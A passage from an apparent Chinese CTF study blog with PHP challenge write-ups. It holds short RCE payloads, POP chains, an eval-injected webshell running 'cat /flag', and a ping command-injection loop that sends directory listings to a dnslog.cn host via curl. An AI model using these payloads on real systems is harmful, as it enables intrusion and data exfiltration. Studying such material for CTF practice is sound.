class="variable">$_</span>++;  <span class="comment">//T</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>;  <span class="comment">//拼接_和POST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_POST[0]($_POST[1])</span></span><br></pre></td></tr></table></figure><h2 id="RCE4，RCE5"><a href="#RCE4，RCE5" class="headerlink" title="RCE4，RCE5"></a>RCE4，RCE5</h2><p>之后就是越来越少的长度，就直接分析一下师傅们的pyload</p><h3 id="72位"><a href="#72位" class="headerlink" title="72位"></a>72位</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f* </span><br></pre></td></tr></table></figure></blockquote><h3 id="68位"><a href="#68位" class="headerlink" title="68位"></a>68位</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//巧妙的把两次$_++放在一起</span></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=_.++$_.$a[$_++/$_++].++$_.++$_//$a直接拼接出_POST $$a[_POST]($$a[_])//$_POST[_POST]($_POST[_]) </span><br></pre></td></tr></table></figure></blockquote><h3 id="62位"><a href="#62位" class="headerlink" title="62位"></a>62位</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(_._)[_];<span class="comment">//N  //本地使用就用(_._._)[_]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$%FA=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$$%FA[$%FA=_.++<span class="variable">$_</span>.$%FA[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>]($$%FA[%FF]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//将拼接放到同一行,真的太厉害了,我只能感叹一句nb</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常题目练习（一）</title>
      <link href="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="日常题目练习（一）"><a href="#日常题目练习（一）" class="headerlink" title="日常题目练习（一）"></a>日常题目练习（一）</h1><h2 id="SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="SWPUCTF 2022 新生赛]ez_ez_unserialize"></a><a href="https://www.nssctf.cn/problem/3082">SWPUCTF 2022 新生赛]ez_ez_unserialize</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class X</span><br><span class="line">&#123;</span><br><span class="line">    public $x = &quot;fllllllag.php&quot;;</span><br><span class="line">//    function __construct($x)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;x = $x;</span><br><span class="line">//    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;x !== *__FILE__*) &#123;</span><br><span class="line">            $this-&gt;x = &quot;fllllllag.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file($this-&gt;x);</span><br><span class="line">        //flag is in fllllllag.php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new X();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>简单的pop链书写，注意写的时候construct会报错，将其注释即可</p><h2 id="鹏城杯-2022-简单的php"><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h2><p>这题学到了一些新的知识点</p><p>无参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if(strlen($code) &gt; 80 or preg_match(&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;,$code))&#123;</span><br><span class="line">        die(&#x27; Hello&#x27;);</span><br><span class="line">    &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;, &#x27;&#x27;, $code))&#123;</span><br><span class="line">        @eval($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一个无参rce</p><p>一个无数字字母rce，好家伙，可是不简单</p><p>无参rce没过滤system<a href="https://xz.aliyun.com/t/10212#toc-4">https://xz.aliyun.com/t/10212#toc-4</a></p><p>system(current(getallheaders()));</p><p>结合无数字字母的异或</p><p>?code&#x3D;[<del>%8c%86%8c%8b%9a%92][!%FF]([</del>%9c%8a%8d%8d%9a%91%8b]<a href="%5B~%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%5D%5B!%EF%BF%BD%5D()">!%FF</a>); </p><p><code>[!%FF]</code>来分割</p><p>二维数组进行拼接必须有用[!%FF]进行分隔</p><p>##[UUCTF 2022 新生赛]ez_unser</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(*<span class="keyword">__FILE__</span>*);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>本来想绕过wakeup的，结果正则给限制的死死的，这里利用变量传递，将a的值传递给b</p><h2 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h2><p>查看源码可进入下一关</p><p>&#x2F;NsScTf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢 </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123; </span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>); </span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123; </span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>)) </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示说是post传参，有些疑惑，</p><p>post传</p><p>p&#x3D;nss2::ctf</p><p>得到flag</p><h2 id="FSCTF-ez-eval"><a href="#FSCTF-ez-eval" class="headerlink" title="FSCTF [ez_eval]"></a>FSCTF [ez_eval]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="variable">$word</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$word</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$word</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>. <span class="variable">$word</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>多亏了晨曦师傅的指导，本来用的&lt;script${IFS}language&#x3D;’php’&gt;@eval($_POST[a]);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get：?word=&lt;script%09language=&#x27;php&#x27;&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">post：shell=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>晨曦师傅说${IFS}在bash里才能用</p><h2 id="ping无回显"><a href="#ping无回显" class="headerlink" title="ping无回显"></a>ping无回显</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$target</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 1 &#x27;</span> . <span class="variable">$target</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?ip&#x3D;xhzw8u.dnslog.cn|ls &#x2F;| while read line; do echo $line.xhzw8u.dnslog.cn | xargs curl; done</p><p>bzd3p6.dnslog.cn|ls &#x2F;app| while read line; do echo $line.bzd3p6.dnslog.cn | xargs curl; done</p><p>dnslog循坏外带</p><h2 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题即有长长的黑名单过滤，还有字符的过滤，麻了。题目描述有数学函数，尝试了一个数学函数</p><p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029204949806-1700015833096-28-1700989374410-38-1700994492324-13.png" alt="image-20231029204949806"></p><p>发现正好可以执行，看到题目里给的网站，。里面好多的数学函数利用，猜测主要利用到base_convert()</p><p>他可以实现任意进制之间的转换</p><p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029205130112-1700015833096-30-1700989374410-39-1700994492325-14.png" alt="image-20231029205130112"></p><p>经过了解哈，最高可以到36进制</p><p><strong>36进制</strong>，是数据的一种表示方法。同我们日常生活中的表示法不一样。它由0-9，A-Z组成，字母不区分大小写。与10进制的对应关系是：0-9对应0-9；A-F对应10-35。</p><p>进制说明：36进制是 0-Z （0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ）。</p><p>这个函数的作用是任何进制之间转换数字</p><p>这里用大于26的进制就能构造</p><p>这里我没想的到的是，这里构造的高进制数字会当作字符串处理,而不是当作数字处理</p><p>测试一下，可行转换可以用赛博厨子的frombase解密（就是从36进制转到10进制）</p><p>?c&#x3D;base_convert(55490343972,10,36)()</p><p><img 